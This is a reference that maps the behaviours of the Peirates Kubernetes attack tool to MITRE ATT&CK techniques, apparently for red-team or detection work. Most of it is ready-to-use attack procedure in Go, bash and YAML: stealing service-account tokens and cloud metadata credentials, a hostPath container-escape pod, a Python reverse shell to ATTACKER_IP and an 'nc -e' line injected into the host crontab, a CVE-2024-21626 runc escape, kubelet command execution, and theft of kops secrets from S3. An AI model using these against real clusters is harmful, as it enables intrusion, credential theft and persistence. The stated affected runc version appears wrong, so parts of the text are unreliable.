# Peirates Attack Behaviors - MITRE ATT&CK Mapping

## Behavior 1: Import Pod Service Account Token

**MITRE Techniques**: T1078.004 (Valid Accounts: Cloud Accounts)

**Description**: Automatically discover and import the service account token mounted into the current pod.

**Procedures**:

```go
// Read mounted service account credentials
const ServiceAccountPath = "/var/run/secrets/kubernetes.io/serviceaccount/"

// Step 1: Get API server from environment
apiServer := os.Getenv("KUBERNETES_SERVICE_HOST") + ":" + 
             os.Getenv("KUBERNETES_SERVICE_PORT")

// Step 2: Read token file
token := readFile(ServiceAccountPath + "token")

// Step 3: Read namespace
namespace := readFile(ServiceAccountPath + "namespace")

// Step 4: Read CA certificate
caCert := readFile(ServiceAccountPath + "ca.crt")

// Step 5: Construct connection info
connectionString := ServerInfo{
    APIServer:  "https://" + apiServer,
    Token:      token,
    Namespace:  namespace,
    CACertData: caCert,
}
```

**Function**: `ImportPodServiceAccountToken()`

---

## Behavior 2: Steal Service Account Tokens from Kubernetes Secrets

**MITRE Techniques**: T1555 (Credentials from Password Stores)

**Description**: Enumerate and extract service account tokens from Kubernetes secrets via API.

**Procedures**:

```bash
# Step 1: List all secrets
kubectl get secrets -o json

# Step 2: Extract token from specific secret
kubectl get secret <secret-name> -o jsonpath='{.data.token}' | base64 -d

# Step 3: Parse JWT to get namespace and SA name
# Decode JWT sub field: "system:serviceaccount:namespace:sa-name"
```

**Peirates Commands**:
```
peirates> list-secrets
peirates> secret-to-sa <secret-name>
```

**Function**: `GetSecrets()`, secret extraction logic

---

## Behavior 3: Harvest Credentials from Node Filesystem

**MITRE Techniques**: 
- T1552.001 (Unsecured Credentials: Credentials In Files)
- T1552.007 (Unsecured Credentials: Container API)

**Description**: Scan node filesystem for kubelet credentials, pod tokens, and other sensitive files.

**Procedures**:

```go
// Target paths
paths := []string{
    "/var/lib/kubelet/kubeconfig",
    "/var/lib/kubelet/pods/",
    "/etc/kubernetes/kubelet.conf",
    "/etc/kubernetes/admin.conf",
}

// Step 1: Read kubelet kubeconfig
config := readYAML("/var/lib/kubelet/kubeconfig")
clientCert := base64Decode(config.users[0].user["client-certificate-data"])
clientKey := base64Decode(config.users[0].user["client-key-data"])

// Step 2: Scan all pod directories
for podDir in listDir("/var/lib/kubelet/pods/") {
    // Check for secret volumes
    secretPath := podDir + "/volumes/kubernetes.io~secret/"
    for secret in listDir(secretPath) {
        if contains(secret, "-token-") {
            token := readFile(secretPath + secret + "/token")
            storeToken(token)
        }
    }
    
    // Check for projected volumes (K8s 1.21+)
    projectedPath := podDir + "/volumes/kubernetes.io~projected/"
    for vol in listDir(projectedPath) {
        if contains(vol, "kube-api-access-") {
            token := readFile(projectedPath + vol + "/token")
            storeToken(token)
        }
    }
}
```

**Peirates Command**: `nodefs-steal-secrets`

**Functions**: `gatherPodCredentials()`, `checkForNodeCredentials()`

---

## Behavior 4: Steal AWS Credentials from Metadata API

**MITRE Techniques**: T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)

**Description**: Request IAM credentials from AWS Instance Metadata Service.

**Procedures**:

**IMDSv1 (Session-less)**:
```bash
# Step 1: Get IAM role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 2: Get credentials for role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Response:
# {
#   "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
#   "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG...",
#   "Token": "FwoGZXIvYXdzEBYaD..."
# }
```

**IMDSv2 (Token-based)**:
```bash
# Step 1: Get session token (6 hour TTL)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Get role name with token
ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Step 3: Get credentials with token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
```

**Peirates Command**: `aws-get-token`

**Functions**: `PullIamCredentialsFromAWS()`, `PullIamCredentialsFromAWSWithIMDSv2()`

---

## Behavior 5: Steal GCP Credentials from Metadata API

**MITRE Techniques**: T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)

**Description**: Request service account access tokens and kube-env data from GCP metadata.

**Procedures**:

```bash
# Step 1: Get access token for default service account
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Response:
# {
#   "access_token": "ya29.c.Kl6iB...",
#   "expires_in": 3599,
#   "token_type": "Bearer"
# }

# Step 2: Get kube-env (contains cluster secrets)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env

# kube-env contains:
# - CA_CERT (base64 encoded)
# - KUBELET_CERT
# - KUBELET_KEY
# - KUBERNETES_MASTER_NAME
```

**Peirates Commands**: `gcp-get-token`, `gcp-attack-kube-env`

**Functions**: `GetGCPBearerTokenFromMetadataAPI()`, `attackKubeEnvGCP()`

---

## Behavior 6: Create Malicious Pod with HostPath Mount

**MITRE Techniques**: 
- T1610 (Deploy Container)
- T1611 (Escape to Host)

**Description**: Deploy a pod that mounts the host's root filesystem, enabling container escape.

**Procedures**:

```yaml
# Step 1: Create malicious pod manifest
apiVersion: v1
kind: Pod
metadata:
  name: attack-pod-abc123
  namespace: default
spec:
  containers:
  - name: attack-container
    image: alpine:latest
    command: ["/bin/sh", "-c", "sleep infinity"]
    volumeMounts:
    - mountPath: /root         # Mount point inside container
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /                  # Entire host filesystem!
```

```bash
# Step 2: Apply manifest
kubectl apply -f attack-pod.yaml

# Step 3: Exec into pod
kubectl exec -it attack-pod-abc123 -- /bin/sh

# Step 4: Access host filesystem
ls /root/etc/      # Actually /etc on the host
ls /root/var/      # Actually /var on the host
```

**Peirates Command**: `attack-pod-hostpath-mount`

**Function**: `MountRootFS()`

---

## Behavior 7: Inject Cron Job for Persistence

**MITRE Techniques**: T1053.003 (Scheduled Task: Cron)

**Description**: Modify host's crontab from container to establish persistence with reverse shell.

**Procedures**:

```bash
# From pod with hostPath mount to /
# Step 1: Create reverse shell cron entry
cat >> /root/etc/crontab << 'EOF'
* * * * * root python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
EOF

# Step 2: Cron will execute every minute on the host
# Result: Reverse shell to attacker IP/port
```

**Alternative - CVE-2024-21626**:
```yaml
# Exploit runc workingDir path traversal
spec:
  containers:
  - image: alpine
    workingDir: /proc/self/fd/8
    command:
    - /bin/sh
    - -c
    - echo "* * * * * root nc -e /bin/sh IP PORT" >> ../../../../etc/crontab
```

**Functions**: `MountRootFS()` crontab injection, `createLeakyVesselPod()`

---

## Behavior 8: Exploit CVE-2024-21626 for Container Escape

**MITRE Techniques**: 
- T1203 (Exploitation for Client Execution)
- T1611 (Escape to Host)

**Description**: Exploit runc path traversal vulnerability via workingDir to escape to host.

**Procedures**:

```yaml
# Step 1: Create exploit pod
apiVersion: v1
kind: Pod
metadata:
  name: cve-2024-21626-exploit
spec:
  containers:
  - name: escape
    image: alpine:latest
    workingDir: /proc/self/fd/8    # File descriptor path traversal
    command:
    - /bin/sh
    - -c
    - |
      # Traverse to host filesystem
      echo "payload" >> ../../../../etc/crontab
      cat ../../../../etc/passwd
```

**Vulnerability Details**:
- Affects runc versions < 1.12
- workingDir allows path traversal via /proc/self/fd/8
- Enables write access to host filesystem

**Peirates Command**: `leakyvessels`

**Function**: `createLeakyVesselPod()`

---

## Behavior 9: Enumerate Pods and Namespaces

**MITRE Techniques**: T1613 (Container and Resource Discovery)

**Description**: List all pods and namespaces to identify targets for lateral movement.

**Procedures**:

```bash
# Step 1: List namespaces (cluster scope)
kubectl get namespaces

# Step 2: List pods in current namespace
kubectl get pods

# Step 3: List pods across all namespaces
kubectl get pods --all-namespaces

# Step 4: Get detailed pod information
kubectl describe pod <pod-name>
kubectl get pod <pod-name> -o json

# Step 5: Check for privileged pods
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].securityContext.privileged}{"\n"}{end}'
```

**Peirates Commands**: `list-pods`, `get-pods`, `dump-pod-info`, `list-ns`

**Functions**: `getPodList()`, `GetNamespaces()`

---

## Behavior 10: Discover Volume Mounts

**MITRE Techniques**: T1613 (Container and Resource Discovery)

**Description**: Enumerate volume mounts to find sensitive data and escape vectors.

**Procedures**:

```bash
# Get all pods with volume information
kubectl get pods -o json | jq '.items[] | {
  name: .metadata.name,
  volumes: .spec.volumes,
  mounts: .spec.containers[].volumeMounts
}'

# Look for:
# - hostPath volumes (container escape)
# - secret volumes (credentials)
# - configMap volumes (configuration)
# - nfs/iscsi (network storage)
```

**Peirates Command**: `find-volume-mounts`

---

## Behavior 11: Execute Commands in Pods via Kubernetes API

**MITRE Techniques**: T1609 (Container Administration Command)

**Description**: Use kubectl exec to run commands in target pods.

**Procedures**:

```bash
# Step 1: Exec into single pod
kubectl exec -it <pod-name> -- /bin/sh

# Step 2: Run command in pod
kubectl exec <pod-name> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Step 3: Exec in specific container (multi-container pod)
kubectl exec -it <pod-name> -c <container-name> -- /bin/bash
```

**Peirates Command**: `exec-via-api`

**Function**: `runKubectlWithConfig()` with exec arguments

---

## Behavior 12: Execute Commands via Kubelet API

**MITRE Techniques**: 
- T1021.007 (Remote Services: Cloud Services)
- T1609 (Container Administration Command)

**Description**: Bypass Kubernetes RBAC by directly accessing Kubelet API on nodes.

**Procedures**:

```bash
# Step 1: Get node IPs
kubectl get nodes -o wide

# Step 2: List pods on node (unauthenticated - port 10255)
curl http://<NODE_IP>:10255/pods

# Step 3: Execute command (weak auth - port 10250)
curl -k -X POST https://<NODE_IP>:10250/run/<NAMESPACE>/<POD>/<CONTAINER>/ \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

**Code Pattern**:
```go
// TLS verification disabled for attack
tr := &http.Transport{
    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
}
client := &http.Client{Transport: tr}

// POST command execution
data := url.Values{}
data.Set("cmd", "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
req := http.NewRequest("POST", kubeletURL, strings.NewReader(data.Encode()))
```

**Peirates Command**: `exec-via-kubelet`

**Function**: `ExecuteCodeOnKubelet()`

---

## Behavior 13: Switch Between Service Account Contexts

**MITRE Techniques**: T1078.004 (Valid Accounts: Cloud Accounts)

**Description**: Switch between multiple stolen service account tokens to find elevated privileges.

**Procedures**:

```go
// Step 1: List available service accounts
for _, sa := range serviceAccounts {
    fmt.Printf("%s - %s\n", sa.Name, sa.Token[:20])
}

// Step 2: Switch to specific SA
connectionString.Token = targetSA.Token
connectionString.TokenName = targetSA.Name

// Step 3: Test permissions with new token
kubectlAuthCanI(connectionString, "create", "pods")
kubectlAuthCanI(connectionString, "get", "secrets")
```

**Peirates Commands**: `sa-menu`, `switch-sa`, `list-sa`

**Functions**: `switchServiceAccount()`, menu handlers

---

## Behavior 14: Brute-Force Try All Service Accounts

**MITRE Techniques**: T1078.004 (Valid Accounts: Cloud Accounts)

**Description**: Attempt kubectl commands with every available service account until one succeeds.

**Procedures**:

```go
// Try command with all SAs
for _, sa := range serviceAccounts {
    cfg := ServerInfo{
        Token: sa.Token,
        // ... other config
    }
    
    stdout, stderr, err := runKubectlSimple(cfg, "get", "secrets")
    if err == nil {
        fmt.Printf("SUCCESS with SA: %s\n", sa.Name)
        return stdout, nil
    }
}
```

**Peirates Commands**: `kubectl-try-all`, `kubectl-try-all-until-success`

**Function**: `attemptEveryAccount()`

---

## Behavior 15: Enumerate /proc for Process Discovery

**MITRE Techniques**: T1057 (Process Discovery)

**Description**: Scan /proc filesystem to discover running processes and extract command-line arguments.

**Procedures**:

```go
// Step 1: List all PIDs
for _, pid := range listDir("/proc") {
    if !isNumeric(pid) {
        continue
    }
    
    // Step 2: Read process cmdline
    cmdline := readFile("/proc/" + pid + "/cmdline")
    
    // Step 3: Look for kubelet process
    if strings.Contains(cmdline, "kubelet") {
        // Step 4: Extract --kubeconfig flag
        kubeconfig := extractFlag(cmdline, "--kubeconfig")
        fmt.Printf("Found kubelet config: %s\n", kubeconfig)
    }
}
```

**Targets**:
- `/proc/*/cmdline` - Process arguments
- `/proc/*/environ` - Environment variables
- `/proc/self/cgroup` - Container detection

**Function**: `getKubeletKubeconfigPath()`, `getCmdLine()`

---

## Behavior 16: TCP Port Scanning

**MITRE Techniques**: T1046 (Network Service Discovery)

**Description**: Scan all TCP ports on target host to discover services.

**Procedures**:

```go
// All-ports scan
for port := 1; port <= 65535; port++ {
    conn, err := net.DialTimeout("tcp", 
        targetIP + ":" + strconv.Itoa(port), 
        timeout)
    
    if err == nil {
        fmt.Printf("Port %d open\n", port)
        conn.Close()
    }
}
```

**Peirates Command**: `tcpscan`

**File**: `portscan.go`

---

## Behavior 17: DNS Enumeration

**MITRE Techniques**: T1046 (Network Service Discovery)

**Description**: Enumerate Kubernetes services via DNS queries.

**Procedures**:

```bash
# DNS naming convention in Kubernetes:
# <service-name>.<namespace>.svc.cluster.local

# Enumerate services
dig kubernetes.default.svc.cluster.local
dig <service>.kube-system.svc.cluster.local

# Brute-force common service names
for svc in api metrics dashboard; do
    dig $svc.default.svc.cluster.local
done
```

**Peirates Command**: `enumerate-dns`

**File**: `enumerate_dns.go`

---

## Behavior 18: Cloud Provider Detection

**MITRE Techniques**: T1580 (Cloud Infrastructure Discovery)

**Description**: Probe metadata APIs to identify cloud provider (AWS, GCP, Azure).

**Procedures**:

```go
// Test AWS
resp := httpGet("http://169.254.169.254/latest/")
if contains(resp, "meta-data") {
    return "AWS"
}

// Test GCP (requires custom header)
req := httpRequest("http://metadata.google.internal/computeMetadata/")
req.Header.Set("Metadata-Flavor", "Google")
if contains(doRequest(req), "v1/") {
    return "Google Cloud"
}

// Test Azure
req = httpRequest("http://169.254.169.254/metadata/instance?api-version=2024-03-15")
req.Header.Set("Metadata", "true")
if contains(doRequest(req), "AzurePublicCloud") {
    return "Azure"
}

// Test AWS IMDSv2
req = httpRequest("PUT", "http://169.254.169.254/latest/api/token")
req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
if statusCode(doRequest(req)) == 200 {
    return "AWS (IMDSv2)"
}
```

**Function**: `populateAndCheckCloudProviders()`

**File**: `cloud_detection.go`

---

## Behavior 19: AWS S3 Bucket Enumeration

**MITRE Techniques**: T1530 (Data from Cloud Storage)

**Description**: List accessible S3 buckets and enumerate objects.

**Procedures**:

```go
// Step 1: Create AWS session with stolen credentials
sess := session.NewSession(&aws.Config{
    Region: aws.String(region),
    Credentials: credentials.NewStaticCredentials(
        AccessKeyId, SecretAccessKey, SessionToken,
    ),
})

// Step 2: List all buckets
svc := s3.New(sess)
result := svc.ListBuckets(nil)
for _, bucket := range result.Buckets {
    fmt.Println(*bucket.Name)
}

// Step 3: List objects in bucket
objects := svc.ListObjectsV2(&s3.ListObjectsV2Input{
    Bucket: aws.String(bucketName),
})
for _, item := range objects.Contents {
    fmt.Println(*item.Key)
}
```

**Peirates Commands**: `aws-s3-ls`, `aws-s3-ls-objects`

**Functions**: `ListAWSBuckets()`, `ListBucketObjects()`

---

## Behavior 20: Kops Cluster Credential Theft from S3

**MITRE Techniques**: T1530 (Data from Cloud Storage)

**Description**: Extract Kubernetes credentials from kops state store in S3/GCS.

**Procedures**:

```go
// Step 1: List all S3 buckets
buckets := ListAWSBuckets(credentials)

// Step 2: Search for kops secrets
for _, bucket := range buckets {
    objects := svc.ListObjectsV2(&s3.ListObjectsV2Input{
        Bucket: aws.String(bucket),
    })
    
    // Step 3: Find paths containing /secrets/
    for _, item := range objects.Contents {
        if strings.Contains(*item.Key, "/secrets/") {
            // Step 4: Download object
            obj := svc.GetObject(&s3.GetObjectInput{
                Bucket: aws.String(bucket),
                Key:    item.Key,
            })
            
            // Step 5: Parse JSON and extract token
            var secret struct {
                Data string `json:"data"`
            }
            json.Unmarshal(objBody, &secret)
            
            // Step 6: Base64 decode token
            token := base64Decode(secret.Data)
            storeToken(token)
        }
    }
}
```

**Peirates Commands**: `attack-kops-aws-1` (AWS), `gcp-attack-kops-1` (GCP)

**Functions**: `KopsAttackAWS()`, `KopsAttackGCP()`

---

## Behavior 21: AWS STS AssumeRole for Privilege Escalation

**MITRE Techniques**: T1078.004 (Valid Accounts: Cloud Accounts)

**Description**: Use AWS STS to assume a different IAM role with higher privileges.

**Procedures**:

```go
// Step 1: Create STS client with current credentials
sess := session.NewSession(&aws.Config{
    Region: aws.String(region),
    Credentials: credentials.NewStaticCredentials(
        currentCreds.AccessKeyId,
        currentCreds.SecretAccessKey,
        currentCreds.SessionToken,
    ),
})
svc := sts.New(sess)

// Step 2: Assume target role
result := svc.AssumeRole(&sts.AssumeRoleInput{
    RoleArn:         &"arn:aws:iam::123456789012:role/AdminRole",
    RoleSessionName: &"sts_session",
})

// Step 3: Extract temporary credentials
newCreds := AWSCredentials{
    AccessKeyId:     *result.Credentials.AccessKeyId,
    SecretAccessKey: *result.Credentials.SecretAccessKey,
    SessionToken:    *result.Credentials.SessionToken,
}
```

**Peirates Command**: `aws-assume-role`

**Function**: `AWSSTSAssumeRole()`

---

## Behavior 22: Check Permissions with Auth Can-I

**MITRE Techniques**: T1087.004 (Account Discovery: Cloud Account)

**Description**: Query Kubernetes API to determine current service account permissions.

**Procedures**:

```bash
# Check specific permission
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i create clusterrolebindings

# Check all permissions
kubectl auth can-i --list
```

**Peirates Implementation** (via API):
```go
// Create SelfSubjectAccessReview
query := SelfSubjectAccessReviewQuery{
    APIVersion: "authorization.k8s.io/v1",
    Kind:       "SelfSubjectAccessReview",
    Spec: SelfSubjectAccessReviewSpec{
        ResourceAttributes: SelfSubjectAccessReviewResourceAttributes{
            Verb:     "create",
            Resource: "pods",
        },
    },
}

// POST to API
DoKubernetesAPIRequest(cfg, "POST",
    "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
    query, &response)

return response.Status.Allowed
```

**Function**: `kubectlAuthCanI()`

---

## Behavior 23: Disable Auth Can-I Checks

**MITRE Techniques**: T1562.001 (Impair Defenses: Disable or Modify Tools)

**Description**: Bypass permission checks to attempt commands regardless of RBAC.

**Procedures**:

```go
// Step 1: Disable auth checks
UseAuthCanI = false

// Step 2: Attempt restricted operation without checking
// Normal flow:
if kubectlAuthCanI(cfg, "create", "pods") {
    runKubectl(cfg, "create", "-f", "pod.yaml")
}

// With checks disabled:
runKubectl(cfg, "create", "-f", "pod.yaml")  // Try anyway
```

**Peirates Command**: `set-auth-can-i`

**Behavior**: Skip permission validation, rely on API server to reject if unauthorized

---

## Summary

**Total Attack Behaviors**: 23

**MITRE Technique Distribution**:
- Credential Access: 8 behaviors
- Discovery: 6 behaviors
- Privilege Escalation: 4 behaviors
- Execution: 3 behaviors
- Persistence: 2 behaviors

**Primary Attack Chains**:
1. Initial Access (Pod SA) → Credential Theft → Privilege Escalation → Container Escape → Persistence
2. Cloud Metadata → AWS/GCP Creds → S3/GCS Enumeration → Data Collection
3. Kubelet API → Command Execution → Token Harvesting → Lateral Movement
